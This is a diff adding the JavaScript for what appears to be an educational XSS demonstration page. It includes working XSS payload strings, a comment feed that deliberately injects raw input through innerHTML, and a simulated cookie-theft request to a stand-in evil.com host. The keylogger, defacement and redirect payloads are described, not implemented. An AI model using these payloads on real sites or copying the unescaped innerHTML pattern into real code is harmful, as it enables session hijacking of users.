+  currentPhase = n;
+  document.getElementById('progressFill').style.width = (n * 25) + '%';
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// ── ATTACK SIMULATION ──────────────────────────────────────────
+const payloads = {
+  alert:   "<script>alert('XSS! Script executed in your browser!')<\/script>",
+  img:     "<img src=x onerror=alert('XSS via onerror!')>",
+  cookie:  "<script>stealCookies()<\/script>",
+  deface:  "<script>defacePage()<\/script>",
+  keylog:  "<script>installKeylogger()<\/script>",
+  redirect:"<script>redirectVictim()<\/script>"
+};
+
+function loadPayload(type) {
+  document.getElementById('attackInput').value = payloads[type];
+}
+
+let commentCount = 2;
+function postComment() {
+  const name = document.getElementById('attackerName').value || 'attacker';
+  const raw = document.getElementById('attackInput').value;
+  const log = document.getElementById('execLog');
+
+  // Add to feed as raw HTML (vulnerable!)
+  const feed = document.getElementById('commentFeed');
+  const div = document.createElement('div');
+  div.className = 'comment';
+  div.innerHTML = `
+    <div class="author" style="color:var(--red)">${escapeHtml(name)} <span style="font-size:10px;color:var(--red-dim);font-family:var(--mono);">[ATTACKER]</span></div>
+    <div class="body">${raw}</div>`;
+  feed.appendChild(div);
+
+  addLog(log, 'warn', `POST /comment — "${name}" submitted input`);
+
+  // Detect and execute payload type
+  setTimeout(() => {
+    if (raw.includes('stealCookies')) {
+      addLog(log, 'err', 'Script tag detected and parsed by browser');
+      addLog(log, 'err', 'document.cookie accessed → sending to evil.com');
+      addLog(log, 'err', 'COOKIE THEFT PAYLOAD EXECUTED');
+      showModal("Cookie theft payload ran!\n\nIn a real attack, document.cookie was read and transmitted to the attacker's server. All visitors are now compromised.");
+    } else if (raw.includes('defacePage')) {
+      addLog(log, 'err', 'Script executed: defacePage()');
+      addLog(log, 'err', 'DOM manipulated — page content replaced');
+      showModal("Page defacement payload ran!\n\nThe script replaced the page content with attacker-controlled HTML. Every visitor sees the defaced page.");
+    } else if (raw.includes('installKeylogger')) {
+      addLog(log, 'err', 'Script executed: installKeylogger()');
+      addLog(log, 'err', 'document.addEventListener("keydown") registered');
+      addLog(log, 'err', 'All keystrokes now being logged silently');
+      showModal("Keylogger installed!\n\nA keydown event listener is now running. Every keystroke — passwords, messages, card numbers — is captured and sent to the attacker.");
+    } else if (raw.includes('redirectVictim')) {
+      addLog(log, 'err', 'Script executed: redirectVictim()');
+      addLog(log, 'err', 'window.location changed → redirecting to phishing site');
+      showModal("Redirect payload ran!\n\nAll visitors would be silently redirected to a phishing site crafted to look identical to this one.");
+    } else if (raw.includes('alert(')) {
+      addLog(log, 'err', 'Script executed: alert()');
+      showModal("XSS Alert!\n\nIf this were a real attack, this alert proves the attacker can execute arbitrary JavaScript in every visitor's browser. Cookie theft would be the next step.");
+    } else if (raw.includes('onerror')) {
+      addLog(log, 'err', 'Image src failed → onerror handler triggered');
+      addLog(log, 'err', 'JavaScript executed via HTML attribute, not <script> tag');
+      showModal("Image onerror XSS!\n\nThis bypasses filters that only look for <script> tags. The onerror attribute on any HTML element can execute JavaScript.");
+    } else {
+      addLog(log, 'ok', 'Comment rendered as plain text — no executable scripts detected');
+    }
+  }, 600);
+}
+
+function resetComments() {
+  document.getElementById('commentFeed').innerHTML = `
+    <div class="comment"><div class="author">alice_2024</div><div class="body">Has anyone tried the new transfer feature? Works great!</div></div>
+    <div class="comment"><div class="author">bob_investor</div><div class="body">Yes, really intuitive. The new dashboard is much faster too.</div></div>`;
+  document.getElementById('execLog').innerHTML = '<div class="entry"><span class="ts">[SYS]</span><span class="msg ok">Page loaded. Awaiting comments...</span></div>';
+  document.getElementById('attackInput').value = '';
+}
+
+// ── COOKIE THEFT ───────────────────────────────────────────────
+function simulateTheft() {
+  const stolen = document.getElementById('stolenDisplay');
+  stolen.style.borderColor = 'var(--red)';
+  stolen.innerHTML = '<span style="color:var(--muted);">Intercepting...</span>';
+
+  setTimeout(() => {
+    stolen.innerHTML = `
+<span style="color:var(--muted)">// Received at evil.com/collect — ${new Date().toISOString()}</span><br><br>
+<span style="color:var(--muted)">GET /steal?</span><span class="stolen-key">sessionid</span>=<span class="stolen-val">8f14e45f-ceea-367f-a27f-e0e6b4a7c3d1</span>&amp;<span class="stolen-key">auth_token</span>=<span class="stolen-val">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>&amp;<span class="stolen-key">CSRF_token</span>=<span class="stolen-val">4c56-af8b-1923</span><br><br>
+<span style="color:var(--green-dim)">✓ Session captured. Replaying cookie as victim...</span><br>
+<span style="color:var(--red)">✗ HttpOnly flag NOT set — full cookie access granted to script</span>`;
+
+    showModal("Cookie theft complete!\n\nThe attacker now has the victim's session ID and auth token. They can paste these into their browser's DevTools and immediately access the victim's account — no password needed.");
+  }, 1200);
+}
+
+// ── HELPERS ────────────────────────────────────────────────────
+function addLog(el, type, msg) {
+  const ts = new Date().toTimeString().slice(0,8);
+  el.innerHTML += `<div class="entry"><span class="ts">[${ts}]</span><span class="msg ${type}">${msg}</span></div>`;
+  el.scrollTop = el.scrollHeight;
+}
+
+function escapeHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function showModal(msg) {
+  document.getElementById('alertBody').innerHTML = msg.replace(/\n/g,'<br>');
+  document.getElementById('alertModal').classList.add('show');
+}
+
+function closeModal() {
+  document.getElementById('alertModal').classList.remove('show');
+}
+</script>
+</body>
+</html>
